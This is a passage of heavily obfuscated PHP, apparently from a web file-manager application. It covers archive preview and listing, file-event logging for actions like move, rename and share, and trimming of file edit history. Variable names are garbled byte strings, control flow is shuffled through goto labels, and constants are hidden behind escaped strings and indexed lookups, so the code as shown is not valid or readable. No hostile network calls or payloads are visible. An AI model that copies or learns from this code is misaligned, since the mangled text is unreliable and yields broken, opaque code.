$b÷öûë¨º“[8] . $B™≠Çä£Â§; if (!@file_exists(self::iconvSystem($bÎîŸµ⁄ôù))) { if (isset($fƒßá‰§áÎ)) { url_request($AæãêÇâﬂ„, $b÷öûë¨º“[1014], $bÎîŸµ⁄ôù); } else { $DíöáØóçÁ = self::localFilePath($AæãêÇâﬂ„, $BŒ„ÂÉåÉº); $bÎîŸµ⁄ôù = $DíöáØóçÁ ? $DíöáØóçÁ : self::download($AæãêÇâﬂ„, $bÎîŸµ⁄ôù); } } goto bÊŒ∂ïùÌû; d⁄âÃë«°‚: return $f±⁄áåÂ¢”[$b÷öûë¨º“[1009]]; goto aùâ°ÍèÎ∞; b“‹Ê¨ı›™: $b÷öûë¨º“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $AæãêÇâﬂ„ = $f√öÑÖ£öà[$b÷öûë¨º“[76]]; $d‡Öô∆Ê Î = isset($f√öÑÖ£öà[$b÷öûë¨º“[1011]]) ? $f√öÑÖ£öà[$b÷öûë¨º“[1011]] : -1; goto A¶Â›ó‹Ù·; bÊŒ∂ïùÌû: $bÎîŸµ⁄ôù = self::iconvSystem($bÎîŸµ⁄ôù); if ($d‡Öô∆Ê Î >= 0) { $F‰ ’Ω≤∞ = isset($f√öÑÖ£öà[$b÷öûë¨º“[1015]]) ? $f√öÑÖ£öà[$b÷öûë¨º“[1015]] : !1; $B´≤Èîàª¡ = isset($f√öÑÖ£öà[$b÷öûë¨º“[28]]) ? $f√öÑÖ£öà[$b÷öûë¨º“[28]] : $b÷öûë¨º“[33]; KodArchive::filePreview($bÎîŸµ⁄ôù, $d‡Öô∆Ê Î, $F‰ ’Ω≤∞, $B´≤Èîàª¡); self::archiveExt(); die; } $f±⁄áåÂ¢” = KodArchive::listContent($bÎîŸµ⁄ôù); goto Eºƒó·æ¬; EêÙÜœ‹∆≤: if (isset($fƒßá‰§áÎ)) { $cõâ√Õÿåè = array($fƒßá‰§áÎ[$b÷öûë¨º“[76]], $fƒßá‰§áÎ[$b÷öûë¨º“[1011]], $fƒßá‰§áÎ[$b÷öûë¨º“[28]]); $B™≠Çä£Â§ = md5(implode($b÷öûë¨º“[71], $cõâ√Õÿåè)) . $b÷öûë¨º“[94] . get_path_ext($fƒßá‰§áÎ[$b÷öûë¨º“[28]]); } else { $cõâ√Õÿåè = array($Dø≈õ¿±‚ß[$b÷öûë¨º“[28]], $Dø≈õ¿±‚ß[$b÷öûë¨º“[76]], $Dø≈õ¿±‚ß[$b÷öûë¨º“[78]]); $B™≠Çä£Â§ = md5(implode($b÷öûë¨º“[71], $cõâ√Õÿåè)) . $b÷öûë¨º“[94] . $BŒ„ÂÉåÉº; } if ($d‡Öô∆Ê Î == -1) { $FòÆ»≥Ò‚„ = IO_PATH_SYSTEM_TEMP . "\172\x69\160\x56\151\x65\167\x2f{$a⁄è¥ë‘√∑}\57{$B™≠Çä£Â§}\x2e\x6c\157\x67"; $D’ˆ ﬂ¡§ı = self::infoFull($FòÆ»≥Ò‚„); if ($D’ˆ ﬂ¡§ı) { $FòÆ»≥Ò‚„ = $D’ˆ ﬂ¡§ı[$b÷öûë¨º“[76]]; $c„œÕÈçæÃ = self::getContent($FòÆ»≥Ò‚„); if ($c„œÕÈçæÃ) { $Eâ„Ô©º€À = json_decode($c„œÕÈçæÃ, !0); if (count($Eâ„Ô©º€À) >= $Fëô¡àÆ›ú) { show_json(sprintf(LNG($b÷öûë¨º“[1013]), count($Eâ„Ô©º€À)), !1); } return $Eâ„Ô©º€À; } } else { $FòÆ»≥Ò‚„ = self::mkfile($FòÆ»≥Ò‚„); } } $fô¿ƒÖë—¨ = TEMP_FILES . $a⁄è¥ë‘√∑; goto EèÓ´ÆÓÙ’; A¶Â›ó‹Ù·: $Fëô¡àÆ›ú = 50000; if (request_url_safe($AæãêÇâﬂ„)) { $fƒßá‰§áÎ = parse_url_query($AæãêÇâﬂ„); if (!isset($fƒßá‰§áÎ[$b÷öûë¨º“[76]])) { show_json($b÷öûë¨º“[1012], !1); } } $f¯ˆŒ¡¢ΩÍ = isset($fƒßá‰§áÎ) ? $fƒßá‰§áÎ[$b÷öûë¨º“[76]] : $AæãêÇâﬂ„; goto f∂Ñ‡ÒµËÏ; Eºƒó·æ¬: self::archiveExt(); del_dir($fô¿ƒÖë—¨); if (!$f±⁄áåÂ¢”[$b÷öûë¨º“[1007]]) { show_json($f±⁄áåÂ¢”[$b÷öûë¨º“[1009]], !1); } goto DçúÜçﬁß€; aùâ°ÍèÎ∞: } private static function fileExt($e∆Ã¶à¢≥) { $D‡êò”ì‰Õ =& $_SERVER[£¿ÌÙëü¡¯¯]; $aíòÎÆ“å∞ = $e∆Ã¶à¢≥[$D‡êò”ì‰Õ[157]]; if ($aíòÎÆ“å∞ == $D‡êò”ì‰Õ[1016]) { $c™ÑúØù◊ = $D‡êò”ì‰Õ[1017]; if (substr($e∆Ã¶à¢≥[$D‡êò”ì‰Õ[28]], -strlen($c™ÑúØù◊)) == $c™ÑúØù◊) { $aíòÎÆ“å∞ = $D‡êò”ì‰Õ[1018]; } } self::archiveExt($aíòÎÆ“å∞); return $aíòÎÆ“å∞; } private static function zipFileList($Eœê©πêÖü, $F’®›ùë›≈ = false) { $eèÖ≥åÊäü =& $_SERVER[£¿ÌÙëü¡¯¯]; $a∑≤¡ﬁöí‚ = array(); foreach ($Eœê©πêÖü as $f∫Èãáíçú) { $DŸë¶“∞Û™ = $f∫Èãáíçú[$eèÖ≥åÊäü[76]]; if ($F’®›ùë›≈) { $DŸë¶“∞Û™ = self::copy($f∫Èãáíçú[$eèÖ≥åÊäü[76]], $F’®›ùë›≈, $eèÖ≥åÊäü[741]); } if ($DŸë¶“∞Û™ && self::local()->exist($DŸë¶“∞Û™)) { $a∑≤¡ﬁöí‚[$f∫Èãáíçú[$eèÖ≥åÊäü[76]]] = $DŸë¶“∞Û™; } } if (!empty($a∑≤¡ﬁöí‚)) { return array_values($a∑≤¡ﬁöí‚); } show_json(LNG($eèÖ≥åÊäü[1019]), !1); } public static function tmpFileName($c ø∏«Ü®Õ) { $d≈§ÉÆÏûµ =& $_SERVER[£¿ÌÙëü¡¯¯]; $D…©”∫ØÇü = array($c ø∏«Ü®Õ[$d≈§ÉÆÏûµ[28]], $c ø∏«Ü®Õ[$d≈§ÉÆÏûµ[76]], $c ø∏«Ü®Õ[$d≈§ÉÆÏûµ[78]], $c ø∏«Ü®Õ[$d≈§ÉÆÏûµ[455]]); return md5(implode($d≈§ÉÆÏûµ[71], $D…©”∫ØÇü)); } private static function localFilePath($CãÍÑ†≤Êå, $d¡…èÂ∏ﬁ—) { goto BˆÇ…€€ÿ£; BˆÇ…€€ÿ£: $CêÆ±Œ¢ó‘ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($d¡…èÂ∏ﬁ— == $CêÆ±Œ¢ó‘[1020] && strtoupper(substr(PHP_OS, 0, 3)) == $CêÆ±Œ¢ó‘[1021]) { return !1; } $F«ÏôÂ≠º∂ = KodIO::parse($CãÍÑ†≤Êå); goto Dßû√éÀ∂≠; eÌÌãÒ«»ñ: if ($Cõå–≥“≥ == $CêÆ±Œ¢ó‘[104] || $Cõå–≥“≥ == $CêÆ±Œ¢ó‘[1023]) { if (!$EïÜ©È‚‹†->exist($EïÜ©È‚‹†->path)) { show_json(LNG($CêÆ±Œ¢ó‘[103]), !1); } return $EïÜ©È‚‹†->path; } return !1; goto BÇ∆Çè√ãÃ; Dßû√éÀ∂≠: if ($F«ÏôÂ≠º∂[$CêÆ±Œ¢ó‘[29]] == KodIO::KOD_SOURCE) { $bŒ‰ÊÉÎ¬– = Model($CêÆ±Œ¢ó‘[749])->fileInfoGet(KodIO::sourceID($CãÍÑ†≤Êå)); if (!$bŒ‰ÊÉÎ¬–[$CêÆ±Œ¢ó‘[76]]) { show_json($CêÆ±Œ¢ó‘[1022], !1); } $CãÍÑ†≤Êå = $bŒ‰ÊÉÎ¬–[$CêÆ±Œ¢ó‘[76]]; } $EïÜ©È‚‹† = self::init($CãÍÑ†≤Êå); $Cõå–≥“≥ = $EïÜ©È‚‹†->getType(); goto eÌÌãÒ«»ñ; BÇ∆Çè√ãÃ: } private static function archiveExt($cÕ∫«ˆËÆ≥ = '') { $GLOBALS[$_SERVER[£¿ÌÙëü¡¯¯][1024]] = $cÕ∫«ˆËÆ≥; } } goto a©∫°∏ùº‘; EÂÂéåô∞ì: function beforeShutdownFatalError($E◊∂’Öç∏¡) { think_exception($E◊∂’Öç∏¡); } $_SERVER[$_SERVER[‚ﬁ][47]] = $Eµ√ãÙØÑÜ($_SERVER[$_SERVER[‚ﬁ][44]]); $b‹´∂íÀ¿ë = E_ALL ^ E_NOTICE ^ E_WARNING ^ E_DEPRECATED; goto f√Ï§é„Ëô; BÀ˘‰÷æ·ä: class SourceEventModel extends ModelBase { protected $tableName = "\151\x6f\137\163\x6f\165\162\143\x65\x5f\145\166\x65\156\x74"; protected $dataAuto = array(array("\143\162\145\x61\x74\145\x54\x69\155\145", "\164\x69\x6d\145", "\151\x6e\x73\x65\162\164", "\x66\165\156\143\164\x69\x6f\156"), array("\x64\x65\x73\x63", '', "\151\x6e\163\145\162\164\x2c\165\160\144\x61\x74\x65\54\x73\x65\154\x65\143\164", "\x6a\163\157\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($b∫Íè€∑ÌΩ, $Fºê«ÈÉè¢, $dãΩ–áãÈè = '') { goto C›¬âéÇç´; B…ëËµ”€ÿ: $fÍ–Èö‡„Ç = array($dí êŒ¶«°[380] => $b∫Íè€∑ÌΩ, $dí êŒ¶«°[2177] => $CøÇõùñÃ©[$dí êŒ¶«°[457]], $dí êŒ¶«°[2178] => $CøÇõùñÃ©[$dí êŒ¶«°[28]], $dí êŒ¶«°[462] => $CøÇõùñÃ©[$dí êŒ¶«°[462]], $dí êŒ¶«°[1340] => USER_ID, $dí êŒ¶«°[385] => $Fºê«ÈÉè¢, $dí êŒ¶«°[1342] => $dãΩ–áãÈè); $this->addSystemLog($Fºê«ÈÉè¢, $fÍ–Èö‡„Ç); return $this->add($fÍ–Èö‡„Ç); goto AÍ◊÷çñ¢à; cﬂàã—ÀÏË: if (!$CøÇõùñÃ©) { return !1; } if ($this->isCacheEvent($CøÇõùñÃ©, $Fºê«ÈÉè¢)) { return; } if ($dãΩ–áãÈè && is_string($dãΩ–áãÈè)) { $dãΩ–áãÈè = array($dí êŒ¶«°[2044] => $dãΩ–áãÈè); } goto B…ëËµ”€ÿ; C›¬âéÇç´: $dí êŒ¶«° =& $_SERVER[£¿ÌÙëü¡¯¯]; if (!$this->eventSave) { return; } $CøÇõùñÃ© = Model($dí êŒ¶«°[1084])->sourceInfo($b∫Íè€∑ÌΩ); goto cﬂàã—ÀÏË; AÍ◊÷çñ¢à: } private function addSystemLog($DÙ´ÕÀÒèÌ, $Büë«Ó¬∂û) { $d™Ó»ü‡ƒÌ =& $_SERVER[£¿ÌÙëü¡¯¯]; if ($DÙ´ÕÀÒèÌ == $d™Ó»ü‡ƒÌ[2179]) { $DÙ´ÕÀÒèÌ = $Büë«Ó¬∂û[$d™Ó»ü‡ƒÌ[401]][$d™Ó»ü‡ƒÌ[2180]]; } else { if (in_array($DÙ´ÕÀÒèÌ, array($d™Ó»ü‡ƒÌ[1990], $d™Ó»ü‡ƒÌ[2181]))) { $DÙ´ÕÀÒèÌ = $Büë«Ó¬∂û[$d™Ó»ü‡ƒÌ[401]][$d™Ó»ü‡ƒÌ[679]]; } } $c‹åîç∏®¡ = array_merge($Büë«Ó¬∂û, array($d™Ó»ü‡ƒÌ[2182] => $Büë«Ó¬∂û[$d™Ó»ü‡ƒÌ[366]], $d™Ó»ü‡ƒÌ[2183] => $Büë«Ó¬∂û[$d™Ó»ü‡ƒÌ[2183]])); Model($d™Ó»ü‡ƒÌ[1955])->addLog($d™Ó»ü‡ƒÌ[2184] . $DÙ´ÕÀÒèÌ, $c‹åîç∏®¡); } private function isCacheEvent($c¡ƒÉüÚ§¨, $dµ”Éø åø) { if ($c¡ƒÉüÚ§¨[$_SERVER[£¿ÌÙëü¡¯¯][368]] == SourceModel::TYPE_SYSTEM) { return !0; } return !1; } public function eventCreate($A“„––„úÍ, $c∑óÀøπÀß) { $dÆ”Ó◊ËÇ“ =& $_SERVER[£¿ÌÙëü¡¯¯]; $DóÁ¥üöà— = Model($dÆ”Ó◊ËÇ“[1084])->sourceInfo($A“„––„úÍ); $dêæ¡Üâ›Ó = array($dÆ”Ó◊ËÇ“[2180] => $c∑óÀøπÀß, $dÆ”Ó◊ËÇ“[28] => $DóÁ¥üöà—[$dÆ”Ó◊ËÇ“[28]]); return $this->addEvent($A“„––„úÍ, $dÆ”Ó◊ËÇ“[2179], $dêæ¡Üâ›Ó); } public function eventFileEdit($bÁ¶á§†¨ö) { $D∏óÈÕÂÇú =& $_SERVER[£¿ÌÙëü¡¯¯]; $Bß»∂¯∏èﬂ = array($D∏óÈÕÂÇú[2185] => $_SERVER[$D∏óÈÕÂÇú[2186]], $D∏óÈÕÂÇú[1657] => strtolower(ACTION)); return $this->addEvent($bÁ¶á§†¨ö, $D∏óÈÕÂÇú[1982], $Bß»∂¯∏èﬂ); } public function eventRecycle($A∫Æ∂ÌÕﬂé, $e≠ßﬁ≥íä) { return $this->addEvent($A∫Æ∂ÌÕﬂé, $_SERVER[£¿ÌÙëü¡¯¯][2181], $e≠ßﬁ≥íä); } public function eventRemove($eñ€ÜÌñ÷±) { $B≥‹Ì∫û‡‰ =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cã«¡…·ãÊ = Model($B≥‹Ì∫û‡‰[1084])->sourceInfo($eñ€ÜÌñ÷±); $fπ”Ñ∆–Éı = $Cã«¡…·ãÊ[$B≥‹Ì∫û‡‰[28]]; return $this->addEvent($Cã«¡…·ãÊ[$B≥‹Ì∫û‡‰[457]], $B≥‹Ì∫û‡‰[1981], $fπ”Ñ∆–Éı); } public function eventShare($Fø€ÃøÃäÓ, $D ∏Í®õÛœ) { return $this->addEvent($Fø€ÃøÃäÓ, $_SERVER[£¿ÌÙëü¡¯¯][1990], $D ∏Í®õÛœ); } public function eventMove($Câ´ì£ìªœ, $cêë¨Ω–Ù©, $Eß∫¿–£«ù) { goto BÃ∞ºë∏ñÚ; BâÏç€ÓÉ≈: $d£≈‚Á√Øá = $b©•Ò™¥†ˆ->sourceInfo($cêë¨Ω–Ù©); $E…ÂÈÈ≤…â = $b©•Ò™¥†ˆ->sourceInfo($Eß∫¿–£«ù); $b±ë†á∞÷á = array($b…ÁÃä‹ËÎ[980] => $cêë¨Ω–Ù©, $b…ÁÃä‹ËÎ[2187] => $d£≈‚Á√Øá[$b…ÁÃä‹ËÎ[28]], $b…ÁÃä‹ËÎ[2188] => $d£≈‚Á√Øá[$b…ÁÃä‹ËÎ[462]], $b…ÁÃä‹ËÎ[981] => $Eß∫¿–£«ù, $b…ÁÃä‹ËÎ[2189] => $E…ÂÈÈ≤…â[$b…ÁÃä‹ËÎ[28]], $b…ÁÃä‹ËÎ[2190] => $E…ÂÈÈ≤…â[$b…ÁÃä‹ËÎ[462]]); goto D€ñ∫◊Ñ¢≤; cœŒÏŸÀóÖ: $this->addEvent($cêë¨Ω–Ù©, $b…ÁÃä‹ËÎ[2191], $b±ë†á∞÷á); goto A›≥πØ”òü; BÃ∞ºë∏ñÚ: $b…ÁÃä‹ËÎ =& $_SERVER[£¿ÌÙëü¡¯¯]; $b©•Ò™¥†ˆ = Model($b…ÁÃä‹ËÎ[1084]); $B√éé∏ê¡‰ = $b©•Ò™¥†ˆ->sourceInfo($Câ´ì£ìªœ); goto BâÏç€ÓÉ≈; D€ñ∫◊Ñ¢≤: $this->addEvent($Câ´ì£ìªœ, $b…ÁÃä‹ËÎ[484], $b±ë†á∞÷á); $B√éé∏ê¡‰ = $b©•Ò™¥†ˆ->sourceInfo($Câ´ì£ìªœ); $b±ë†á∞÷á = array($b…ÁÃä‹ËÎ[366] => $B√éé∏ê¡‰[$b…ÁÃä‹ËÎ[366]], $b…ÁÃä‹ËÎ[28] => $B√éé∏ê¡‰[$b…ÁÃä‹ËÎ[28]]); goto cœŒÏŸÀóÖ; A›≥πØ”òü: } public function eventCopy($B›±õ√¬Ωú) { $this->eventCreate($B›±õ√¬Ωú, $_SERVER[£¿ÌÙëü¡¯¯][482]); } public function eventRename($eÀ£¥ç®Îß, $e—Ñûç…—π, $E∫ÖÕÒÉ›„) { $Eö¬·É’“Í =& $_SERVER[£¿ÌÙëü¡¯¯]; $bä¯’ü¿ìû = array($Eö¬·É’“Í[980] => $e—Ñûç…—π, $Eö¬·É’“Í[981] => $E∫ÖÕÒÉ›„); return $this->addEvent($eÀ£¥ç®Îß, $Eö¬·É’“Í[1097], $bä¯’ü¿ìû); } public function eventAddComment($DÆôª∏Ì¡ü, $e«›÷Í°∫ÿ) { return $this->addEvent($DÆôª∏Ì¡ü, $_SERVER[£¿ÌÙëü¡¯¯][2192], $e«›÷Í°∫ÿ); } public function eventAddDesc($a•Õ˜™‘êû, $fàÂâ≥⁄¯Á) { return $this->addEvent($a•Õ˜™‘êû, $_SERVER[£¿ÌÙëü¡¯¯][2193], $fàÂâ≥⁄¯Á); } public function listBySource($b≥…âÖ∫π¥) { goto eÈâﬂÖ¶™È; bπë˜›¥ïä: if ($Cõ±ÇÍå¥Í[$e—Ú≈ú‡ÿé[367]] == $e—Ú≈ú‡ÿé[84]) { $cŒÁÔßúÑŒ = Model($e—Ú≈ú‡ÿé[1084])->listSearchChildren($b≥…âÖ∫π¥, 20000); $cŒÁÔßúÑŒ[] = $b≥…âÖ∫π¥ . $e—Ú≈ú‡ÿé[358]; $FÑü∫ß¿´˜ = array($e—Ú≈ú‡ÿé[366] => array($e—Ú≈ú‡ÿé[7], $cŒÁÔßúÑŒ)); } $bÿΩãπ¢Üƒ = $this->where($FÑü∫ß¿´˜)->order($e—Ú≈ú‡ÿé[2194])->selectPage(); if ($bÿΩãπ¢Üƒ[$e—Ú≈ú‡ÿé[347]][$e—Ú≈ú‡ÿé[348]] == 0) { $bÿΩãπ¢Üƒ[$e—Ú≈ú‡ÿé[347]][$e—Ú≈ú‡ÿé[348]] = 1; $bÿΩãπ¢Üƒ[$e—Ú≈ú‡ÿé[350]] = array(array($e—Ú≈ú‡ÿé[380] => $b≥…âÖ∫π¥, $e—Ú≈ú‡ÿé[2177] => $Cõ±ÇÍå¥Í[$e—Ú≈ú‡ÿé[457]], $e—Ú≈ú‡ÿé[1340] => $Cõ±ÇÍå¥Í[$e—Ú≈ú‡ÿé[375]], $e—Ú≈ú‡ÿé[385] => $e—Ú≈ú‡ÿé[2195], $e—Ú≈ú‡ÿé[386] => $Cõ±ÇÍå¥Í[$e—Ú≈ú‡ÿé[184]], $e—Ú≈ú‡ÿé[1342] => $e—Ú≈ú‡ÿé[33])); } goto F‰ﬂ¡ï·Æ⁄; eÈâﬂÖ¶™È: $e—Ú≈ú‡ÿé =& $_SERVER[£¿ÌÙëü¡¯¯]; $Cõ±ÇÍå¥Í = Model($e—Ú≈ú‡ÿé[1084])->sourceInfo($b≥…âÖ∫π¥); $FÑü∫ß¿´˜ = array($e—Ú≈ú‡ÿé[380] => $b≥…âÖ∫π¥); goto bπë˜›¥ïä; F‰ﬂ¡ï·Æ⁄: $bÿΩãπ¢Üƒ = $this->eventListParse($bÿΩãπ¢Üƒ, $b≥…âÖ∫π¥); show_json($bÿΩãπ¢Üƒ); goto a¶ò¿ò¶Èö; a¶ò¿ò¶Èö: } private function eventListParse($d£ª≈Ì£ùë, $f∫Ÿ∞µÚ≈—) { goto Cª•Ë˘ˆ—ÿ; B®Ü‹ÀÖöû: $DŸ¶ÖÎµÉÑ = Model($B•¨≠ç÷®ß[749])->sourceListInfo($F≥ëÛæŸõí, !0); foreach ($B…øù äÂ— as &$bÚ„ã°å›¶) { if ($bÚ„ã°å›¶[$B•¨≠ç÷®ß[29]] == $B•¨≠ç÷®ß[484] && isset($bÚ„ã°å›¶[$B•¨≠ç÷®ß[401]][$B•¨≠ç÷®ß[980]])) { $bÚ„ã°å›¶[$B•¨≠ç÷®ß[401]][$B•¨≠ç÷®ß[980]] = $DŸ¶ÖÎµÉÑ[$bÚ„ã°å›¶[$B•¨≠ç÷®ß[401]][$B•¨≠ç÷®ß[980]]]; $bÚ„ã°å›¶[$B•¨≠ç÷®ß[401]][$B•¨≠ç÷®ß[981]] = $DŸ¶ÖÎµÉÑ[$bÚ„ã°å›¶[$B•¨≠ç÷®ß[401]][$B•¨≠ç÷®ß[981]]]; } if ($bÚ„ã°å›¶[$B•¨≠ç÷®ß[29]] == $B•¨≠ç÷®ß[2191] && isset($bÚ„ã°å›¶[$B•¨≠ç÷®ß[401]][$B•¨≠ç÷®ß[366]])) { $bÚ„ã°å›¶[$B•¨≠ç÷®ß[401]][$B•¨≠ç÷®ß[366]] = $DŸ¶ÖÎµÉÑ[$bÚ„ã°å›¶[$B•¨≠ç÷®ß[401]][$B•¨≠ç÷®ß[366]]]; } $bÚ„ã°å›¶[$B•¨≠ç÷®ß[388]] = $DŸ¶ÖÎµÉÑ[$bÚ„ã°å›¶[$B•¨≠ç÷®ß[366]]]; $bÚ„ã°å›¶[$B•¨≠ç÷®ß[2196]] = $DŸ¶ÖÎµÉÑ[$bÚ„ã°å›¶[$B•¨≠ç÷®ß[2183]]]; if ($bÚ„ã°å›¶[$B•¨≠ç÷®ß[29]] == $B•¨≠ç÷®ß[1981]) { $bÚ„ã°å›¶[$B•¨≠ç÷®ß[2196]] = $bÚ„ã°å›¶[$B•¨≠ç÷®ß[388]]; $bÚ„ã°å›¶[$B•¨≠ç÷®ß[2183]] = $bÚ„ã°å›¶[$B•¨≠ç÷®ß[2196]][$B•¨≠ç÷®ß[366]]; $bÚ„ã°å›¶[$B•¨≠ç÷®ß[388]] = !1; $bÚ„ã°å›¶[$B•¨≠ç÷®ß[366]] = $B•¨≠ç÷®ß[33]; } $bÚ„ã°å›¶[$B•¨≠ç÷®ß[2148]] = $fÒ…ÎÍ∆¡ [$bÚ„ã°å›¶[$B•¨≠ç÷®ß[1349]]]; } $d£ª≈Ì£ùë[$B•¨≠ç÷®ß[350]] = $B…øù äÂ—; goto B‰—óù´Ñê; aç…å¡¨≤Í: $F≥ëÛæŸõí = array_unique($F≥ëÛæŸõí); $fÍíòõ∂…´ = array_unique(array_to_keyvalue($B…øù äÂ—, $B•¨≠ç÷®ß[33], $B•¨≠ç÷®ß[1349])); $fÒ…ÎÍ∆¡  = Model($B•¨≠ç÷®ß[469])->userListInfo($fÍíòõ∂…´); goto B®Ü‹ÀÖöû; c⁄∆ÎßèÕ◊: $Eœ·Ç∞ÏÖâ = array_to_keyvalue($B…øù äÂ—, $B•¨≠ç÷®ß[33], $B•¨≠ç÷®ß[2183]); foreach ($B…øù äÂ— as $bÚ„ã°å›¶) { $b‚„ﬂ˘¨Üò = $bÚ„ã°å›¶[$B•¨≠ç÷®ß[401]]; if ($bÚ„ã°å›¶[$B•¨≠ç÷®ß[29]] == $B•¨≠ç÷®ß[484] && isset($b‚„ﬂ˘¨Üò[$B•¨≠ç÷®ß[980]])) { $F≥ëÛæŸõí[] = $b‚„ﬂ˘¨Üò[$B•¨≠ç÷®ß[980]] . $B•¨≠ç÷®ß[33]; $F≥ëÛæŸõí[] = $b‚„ﬂ˘¨Üò[$B•¨≠ç÷®ß[981]] . $B•¨≠ç÷®ß[33]; } if ($bÚ„ã°å›¶[$B•¨≠ç÷®ß[29]] == $B•¨≠ç÷®ß[2191] && isset($b‚„ﬂ˘¨Üò[$B•¨≠ç÷®ß[366]])) { $F≥ëÛæŸõí[] = $b‚„ﬂ˘¨Üò[$B•¨≠ç÷®ß[366]] . $B•¨≠ç÷®ß[33]; } } $F≥ëÛæŸõí = array_merge($F≥ëÛæŸõí, $Eœ·Ç∞ÏÖâ, array($f∫Ÿ∞µÚ≈— . $B•¨≠ç÷®ß[33])); goto aç…å¡¨≤Í; B‰—óù´Ñê: return $d£ª≈Ì£ùë; goto A≥Ω±É‘ûñ; Cª•Ë˘ˆ—ÿ: $B•¨≠ç÷®ß =& $_SERVER[£¿ÌÙëü¡¯¯]; $B…øù äÂ— = $d£ª≈Ì£ùë[$B•¨≠ç÷®ß[350]]; $F≥ëÛæŸõí = array_to_keyvalue($B…øù äÂ—, $B•¨≠ç÷®ß[33], $B•¨≠ç÷®ß[366]); goto c⁄∆ÎßèÕ◊; A≥Ω±É‘ûñ: } public function removeBySource($f¶÷Û§◊Ëﬁ) { $D∞¯” ΩøÈ = array($_SERVER[£¿ÌÙëü¡¯¯][380] => $f¶÷Û§◊Ëﬁ); $this->where($D∞¯” ΩøÈ)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\137\x73\x6f\x75\x72\x63\x65\137\150\151\163\x74\x6f\x72\171"; public function addHistory($DÖ›‡¶¯Ñ¢, $A‡¡ÒÀ›≥« = '') { $c„≤®â‘Â¿ =& $_SERVER[£¿ÌÙëü¡¯¯]; $dé—¡Ñ“êÊ = array($c„≤®â‘Â¿[380] => $DÖ›‡¶¯Ñ¢[$c„≤®â‘Â¿[366]], $c„≤®â‘Â¿[1340] => isset($DÖ›‡¶¯Ñ¢[$c„≤®â‘Â¿[376]]) ? $DÖ›‡¶¯Ñ¢[$c„≤®â‘Â¿[376]] : $DÖ›‡¶¯Ñ¢[$c„≤®â‘Â¿[375]], $c„≤®â‘Â¿[416] => $DÖ›‡¶¯Ñ¢[$c„≤®â‘Â¿[415]], $c„≤®â‘Â¿[512] => $DÖ›‡¶¯Ñ¢[$c„≤®â‘Â¿[78]], $c„≤®â‘Â¿[2197] => $A‡¡ÒÀ›≥«); $a“Éú»î∏¿ = $GLOBALS[$c„≤®â‘Â¿[6]][$c„≤®â‘Â¿[85]][$c„≤®â‘Â¿[2198]]; if ($a“Éú»î∏¿ > 1) { $this->historyAutoClear($dé—¡Ñ“êÊ[$c„≤®â‘Â¿[366]]); $this->add($dé—¡Ñ“êÊ); } Model($c„≤®â‘Â¿[2199])->eventFileEdit($DÖ›‡¶¯Ñ¢[$c„≤®â‘Â¿[366]]); } private function historyAutoClear($E¥≥±Ïà÷•) { goto c‚„Ù˜·≠¢; F˜ÉÌ⁄àŸ´: if ($Bîäë˘ïÇˆ >= 500) { return; } $C¶„∞ÌàÒŒ = array($B¢ôÊùï™ö[380] => $E¥≥±Ïà÷•); $b≥≤·ı∏∂Ç = $this->field($B¢ôÊùï™ö[2202])->where($C¶„∞ÌàÒŒ)->order($B¢ôÊùï™ö[2194])->select(); goto CûòßŒÊ€è; CûòßŒÊ€è: if (!$b≥≤·ı∏∂Ç || $Bîäë˘ïÇˆ >= count($b≥≤·ı∏∂Ç)) { return; } $eÉ¨ôÙ¿‚ì = array_to_keyvalue($b≥≤·ı∏∂Ç, $B¢ôÊùï™ö[33], $B¢ôÊùï™ö[364]); $eÉ¨ôÙ¿‚ì = array_slice($eÉ¨ôÙ¿‚ì, $Bîäë˘ïÇˆ); goto c·ÛáÍõ¿ƒ; eÏïÌáÍõπ: $C¶„∞ÌàÒŒ = array($B¢ôÊùï™ö[382] => array($B¢ôÊùï™ö[7], $eÉ¨ôÙ¿‚ì)); $this->where($C¶„∞ÌàÒŒ)->delete(); Model($B¢ôÊùï™ö[418])->remove($bÑ—âƒæË∆); goto fÊÆ¶øÖùø; c‚„Ù˜·≠¢: $B¢ôÊùï™ö =& $_SERVER[£¿ÌÙëü¡¯¯]; $F´æôÕèÈ∏ = Model($B¢ôÊùï™ö[1062])->get($B¢ôÊùï™ö[2200]); $cçÂò‚ù‚€ = $GLOBALS[$B¢ôÊùï™ö[6]][$B¢ôÊùï™ö[85]][$B¢ôÊùï™ö[2198]]; goto Eß¿‹ﬁ˘∂‡; c·ÛáÍõ¿ƒ: $bÑ—âƒæË∆ = array_to_keyvalue($b≥≤·ı∏∂Ç, $B¢ôÊùï™ö[33], $B¢ôÊùï™ö[415]); $bÑ—âƒæË∆ = array_slice($bÑ—âƒæË∆, $Bîäë˘ïÇˆ); if (!$eÉ¨ôÙ¿‚ì || !$bÑ—âƒæË∆) { return; } goto eÏïÌáÍõπ; Eß¿‹ﬁ˘∂‡: $fà´Ÿ§ùÍÁ = $F´æôÕèÈ∏ == $B¢ôÊùï™ö[2201] ? 3 : $cçÂò‚ù‚€; if ($cçÂò‚ù‚€ <= 1) { $fà´Ÿ§ùÍÁ = 1; } $Bîäë˘ïÇˆ = $fà´Ÿ§ùÍÁ - 1; goto F˜ÉÌ⁄àŸ´; fÊÆ¶øÖùø: } public function listData($FÕÔ‡ÃùÉù) { goto eﬂß∑˘‚∞¯; dóÖÙëÛÖÕ: $f¶∂ñ€Ê¥Ô = 3; if ($A∑√êµÒÔÖ == $cÇª©â¢çÓ[2201]) { $fÔƒ‡êŒ‚ä[$cÇª©â¢çÓ[350]] = array_slice($fÔƒ‡êŒ‚ä[$cÇª©â¢çÓ[350]], 0, $f¶∂ñ€Ê¥Ô); $fÔƒ‡êŒ‚ä[$cÇª©â¢çÓ[347]] = array($cÇª©â¢çÓ[2204] => 1, $cÇª©â¢çÓ[2205] => 20, $cÇª©â¢çÓ[2206] => 1, $cÇª©â¢çÓ[2207] => count($fÔƒ‡êŒ‚ä[$cÇª©â¢çÓ[350]])); } return $fÔƒ‡êŒ‚ä; goto dÆ—ı€‹ÍÃ; b–âË≥àΩÚ: $fÔƒ‡êŒ‚ä = $this->field($cÈÿÃë÷‹Ê)->where($EÓ“ﬁ‘ÿÕ…)->order($cÇª©â¢çÓ[2194])->selectPage(); $this->_listAppendUser($fÔƒ‡êŒ‚ä[$cÇª©â¢çÓ[350]]); 